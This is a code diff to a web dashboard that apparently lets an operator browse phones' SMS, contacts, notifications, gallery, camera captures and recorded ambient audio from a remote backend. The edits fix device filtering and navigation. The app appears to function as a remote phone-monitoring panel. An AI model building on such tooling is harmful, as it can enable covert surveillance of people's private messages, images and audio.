@@ -17,7 +17,7 @@ import ConfirmDeleteModal from "@/components/ConfirmDeleteModal";
 import { motion, AnimatePresence } from "framer-motion";
 import { 
     Image as ImageIcon, MessageSquare, Users, Flashlight, Vibrate, Camera, 
-    Bell, Mic, Settings, LogOut, Smartphone, Download, Menu, X, ChevronDown, 
+    Bell, Mic, Settings, LogOut, Smartphone, Download, Menu, X, ChevronDown, ChevronLeft,
     Check, Play, Square, Video, RefreshCw, Search, Trash2, CheckSquare, Folder, Maximize, Minimize, Settings2, Package, Activity, Crown, Zap 
 } from 'lucide-react';
 import AppNavigation from "@/components/AppNavigation";
@@ -93,11 +93,10 @@ export default function Home() {
 
     // Support browser Back button / swipe back from tool views to main dashboard
     useEffect(() => {
-        const handlePopState = (event: PopStateEvent) => {
-            if (!event.state?.tool && !window.location.hash.includes('tool=')) {
-                setSelectedTool(null);
-            } else if (event.state?.tool) {
-                setSelectedTool(event.state.tool);
+        const handlePopState = () => {
+            setSelectedTool(null);
+            if (typeof window !== 'undefined' && window.location.hash.includes('tool=')) {
+                try { window.history.replaceState('', document.title, window.location.pathname + window.location.search); } catch {}
             }
         };
         window.addEventListener('popstate', handlePopState);
@@ -155,6 +154,7 @@ export default function Home() {
                 setImages([]);
                 setFolders([]);
                 setCapturedMedia([]);
+                setCapturedVoice([]);
             }
 
             if ((window as any).fetchGalleryData) {
@@ -162,6 +162,9 @@ export default function Home() {
             }
             if ((window as any).fetchCameraData) {
                 (window as any).fetchCameraData(1, selectedDeviceId);
+            }
+            if ((window as any).fetchVoiceData) {
+                (window as any).fetchVoiceData(1, selectedDeviceId);
             }
 
             if (uuid) {
@@ -192,6 +195,14 @@ export default function Home() {
                         }
                     }).catch(() => {});
             }
+        } else if (typeof window !== 'undefined') {
+            setContactsList([]);
+            setSmsList([]);
+            setNotifications([]);
+            setImages([]);
+            setFolders([]);
+            setCapturedMedia([]);
+            setCapturedVoice([]);
         }
     }, [selectedDeviceId, session]);
 
@@ -1064,12 +1075,16 @@ export default function Home() {
 
             // Define fetch function so it can be called later
             let isFetchingGallery = false;
-            const fetchGallery = (loadPage = 1, append = false, fetchAll = false, targetDeviceId = localStorage.getItem('selectedDeviceId')) => {
+            const fetchGallery = (loadPage = 1, append = false, fetchAll = false, targetDeviceId = localStorage.getItem('selectedDeviceId') || selectedDeviceIdRef.current) => {
                 if (isFetchingGallery) return;
+                if (!targetDeviceId) {
+                    if (!append) setImages([]);
+                    return;
+                }
                 isFetchingGallery = true;
                 if (append) setIsLoadingMore(true);
                 const limit = fetchAll ? 10000 : 30;
-                const deviceQuery = targetDeviceId ? `&deviceId=${targetDeviceId}` : '';
+                const deviceQuery = `&deviceId=${targetDeviceId}`;
                 fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/images?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                     .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                     .then((data) => {
@@ -1093,7 +1108,7 @@ export default function Home() {
                         setGalleryHasMore(hasMore);
                         setGalleryPage(loadPage);
 
-                        const cacheKey = targetDeviceId ? `gallery_images_${uuid}_${targetDeviceId}` : `gallery_images_${uuid}`;
+                        const cacheKey = `gallery_images_${uuid}_${targetDeviceId}`;
                         try { localStorage.setItem(cacheKey, JSON.stringify(items.slice(0, 100))); } catch { /* storage full */ }
                     })
                     .catch(e => console.error('[Gallery] Fetch error:', e))
@@ -1101,11 +1116,15 @@ export default function Home() {
             };
 
             let isFetchingCamera = false;
-            const fetchCamera = (loadPage = 1, targetDeviceId = localStorage.getItem('selectedDeviceId')) => {
+            const fetchCamera = (loadPage = 1, targetDeviceId = localStorage.getItem('selectedDeviceId') || selectedDeviceIdRef.current) => {
                 if (isFetchingCamera) return;
+                if (!targetDeviceId) {
+                    setCapturedMedia([]);
+                    return;
+                }
                 isFetchingCamera = true;
                 const limit = 10000;
-                const deviceQuery = targetDeviceId ? `&deviceId=${targetDeviceId}` : '';
+                const deviceQuery = `&deviceId=${targetDeviceId}`;
                 fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/camera?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                     .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                     .then((data) => {
@@ -1120,7 +1139,7 @@ export default function Home() {
                         }));
 
                         setCapturedMedia(captures);
-                        const camCacheKey = targetDeviceId ? `gallery_captured_${uuid}_${targetDeviceId}` : `gallery_captured_${uuid}`;
+                        const camCacheKey = `gallery_captured_${uuid}_${targetDeviceId}`;
                         try { localStorage.setItem(camCacheKey, JSON.stringify(captures.slice(0, 100))); } catch { /* storage full */ }
                     })
                     .catch(e => console.error('[Camera] Fetch error:', e))
@@ -1128,11 +1147,15 @@ export default function Home() {
             };
 
             let isFetchingVoice = false;
-            const fetchVoice = (loadPage = 1, targetDeviceId = localStorage.getItem('selectedDeviceId')) => {
+            const fetchVoice = (loadPage = 1, targetDeviceId = localStorage.getItem('selectedDeviceId') || selectedDeviceIdRef.current) => {
                 if (isFetchingVoice) return;
+                if (!targetDeviceId) {
+                    setCapturedVoice([]);
+                    return;
+                }
                 isFetchingVoice = true;
                 const limit = 100;
-                const deviceQuery = targetDeviceId ? `&deviceId=${targetDeviceId}` : '';
+                const deviceQuery = `&deviceId=${targetDeviceId}`;
 
                 fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/voice?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                     .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
@@ -1149,10 +1172,13 @@ export default function Home() {
             (window as any).fetchCameraData = fetchCamera;
             (window as any).fetchVoiceData = fetchVoice;
 
-            // Initial fetch
-            fetchGallery();
-            fetchCamera();
-            fetchVoice();
+            // Initial fetch if device is already selected
+            const initDeviceId = localStorage.getItem('selectedDeviceId') || selectedDeviceIdRef.current;
+            if (initDeviceId) {
+                fetchGallery(1, false, false, initDeviceId);
+                fetchCamera(1, initDeviceId);
+                fetchVoice(1, initDeviceId);
+            }
 
             return () => {
                 if (socket) {
@@ -1253,16 +1279,18 @@ export default function Home() {
 
     // Filtered SMS based on search
     const filteredSms = useMemo(() => {
+        if (!selectedDeviceId) return [];
         if (!smsSearchQuery) return smsList;
         const query = smsSearchQuery.toLowerCase();
         return smsList.filter(sms =>
             sms.address?.toLowerCase().includes(query) ||
             sms.body?.toLowerCase().includes(query)
         );
-    }, [smsList, smsSearchQuery]);
+    }, [smsList, smsSearchQuery, selectedDeviceId]);
 
     // Filtered Contacts based on search
     const filteredContacts = useMemo(() => {
+        if (!selectedDeviceId) return [];
         if (!contactsSearchQuery) return contactsList;
         const query = contactsSearchQuery.toLowerCase();
         return contactsList.filter(contact => {
@@ -1274,7 +1302,18 @@ export default function Home() {
             }) || false;
             return nameMatch || phoneMatch;
         });
-    }, [contactsList, contactsSearchQuery]);
+    }, [contactsList, contactsSearchQuery, selectedDeviceId]);
+
+    // Filtered Camera & Voice captures based on device selection
+    const filteredCapturedMedia = useMemo(() => {
+        if (!selectedDeviceId) return [];
+        return capturedMedia.filter(m => !m.deviceId || m.deviceId === selectedDeviceId || m.deviceId === 'unknown');
+    }, [capturedMedia, selectedDeviceId]);
+
+    const filteredCapturedVoice = useMemo(() => {
+        if (!selectedDeviceId) return [];
+        return capturedVoice.filter(v => !v.deviceId || v.deviceId === selectedDeviceId || v.deviceId === 'unknown');
+    }, [capturedVoice, selectedDeviceId]);
 
 
     const triggerUpload = (count: number | 'all') => {
@@ -2051,7 +2090,7 @@ END:VCARD`;
                                                 <p className="text-[10px] text-pink-400 font-data tracking-widest uppercase">From Camera</p>
                                             </div>
                                         </div>
-                                        {capturedMedia.length > 0 && (
+                                        {filteredCapturedMedia.length > 0 && (
                                             <button 
                                                 onClick={() => {
                                                     setIsCameraSelectMode(!isCameraSelectMode);
@@ -2097,7 +2136,7 @@ END:VCARD`;
 
                                     <div className="flex-1 overflow-y-auto custom-scrollbar pr-2 pb-4">
                                         <div className="grid grid-cols-2 gap-3">
-                                            {capturedMedia.slice(0, 10).map((img: any) => (
+                                            {filteredCapturedMedia.slice(0, 10).map((img: any) => (
                                                 <div 
                                                     key={img.id} 
                                                     className={`flex flex-col bg-black/40 border transition-all rounded-xl overflow-hidden ${isCameraSelectMode && cameraSelectedItems.has(img.id) ? 'border-cyan-500 shadow-[0_0_15px_rgba(6,182,212,0.3)] scale-95' : 'border-white/5 hover:border-pink-500/50 hover:shadow-[0_0_15px_rgba(236,72,153,0.15)]'}`}
@@ -2187,7 +2226,7 @@ END:VCARD`;
                                                 </div>
                                             ))}
                                         </div>
-                                        {capturedMedia.length === 0 && (
+                                        {filteredCapturedMedia.length === 0 && (
                                             <div className="w-full flex flex-col items-center justify-center text-white/30 text-center gap-3 p-4 min-h-[200px] bg-white/5 rounded-2xl border border-white/5 border-dashed mt-2">
                                                 <Camera size={40} strokeWidth={1} />
                                                 <p className="text-xs font-medium">No recent captures.<br/>Snap a photo or record a video!</p>
@@ -2332,13 +2371,13 @@ END:VCARD`;
                                 </div>
                             </div>
                             <div className="flex-1 overflow-y-auto custom-scrollbar p-4 flex flex-col gap-3">
-                                {capturedVoice.length === 0 && (
+                                {filteredCapturedVoice.length === 0 && (
                                     <div className="w-full flex flex-col items-center justify-center text-white/30 text-center gap-3 p-4 min-h-[200px] bg-white/5 rounded-2xl border border-white/5 border-dashed mt-2">
                                         <Mic size={40} strokeWidth={1} />
                                         <p className="text-xs font-medium">No voice notes.<br/>Record some ambient audio!</p>
                                     </div>
                                 )}
-                                {capturedVoice.map((audio: any) => (
+                                {filteredCapturedVoice.map((audio: any) => (
                                     <div key={audio.id} className="w-full bg-black/40 border border-white/5 hover:border-purple-500/50 rounded-xl p-4 flex flex-col gap-3 transition-all hover:shadow-[0_0_15px_rgba(168,85,247,0.15)] group">
                                         {audio.isTemp ? (
                                             <div className="w-full flex items-center justify-center py-4 text-purple-400 gap-2">
@@ -2826,10 +2865,33 @@ END:VCARD`;
                 )}
 
 
+                {selectedTool && (
+                    <div className="max-w-7xl mx-auto px-4 md:px-8 mb-4 flex items-center justify-between">
+                        <button
+                            onClick={() => {
+                                setSelectedTool(null);
+                                if (typeof window !== 'undefined' && window.location.hash.includes('tool=')) {
+                                    try { window.history.replaceState('', document.title, window.location.pathname + window.location.search); } catch {}
+                                }
+                            }}
+                            className="flex items-center gap-2 px-4 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/80 hover:text-white text-xs font-bold uppercase tracking-wider transition-all hover:scale-105 active:scale-95 shadow-md group cursor-pointer"
+                        >
+                            <ChevronLeft size={16} className="text-accent group-hover:-translate-x-1 transition-transform" />
+                            <span>Back to Main Dashboard</span>
+                        </button>
+                        <div className="flex items-center gap-2">
+                            <span className="text-[10px] font-bold text-zinc-500 uppercase tracking-widest font-mono">Active Tool:</span>
+                            <span className="text-xs font-bold text-accent uppercase tracking-wider bg-accent/10 px-3 py-1 rounded-lg border border-accent/20 font-mono">
+                                {selectedTool.toUpperCase()}
+                            </span>
+                        </div>
+                    </div>
+                )}
+
                 {selectedTool === 'gallery' && (
                     <div className="px-4 md:px-8 h-full">
                         <GalleryView 
-                            images={images}
+                            images={!selectedDeviceId ? [] : images}
                             activeTab={activeTab}
                             setActiveTab={setActiveTab}
                             isSelectionMode={isSelectionMode}
@@ -2853,7 +2915,7 @@ END:VCARD`;
                             handleLoadMore={handleLoadMore}
                             
                             // Folder Props
-                            folders={folders}
+                            folders={!selectedDeviceId ? [] : folders}
                             fetchFolders={fetchFolders}
                             isFetchingFolders={isFetchingFolders}
                             selectedDeviceId={selectedDeviceId}
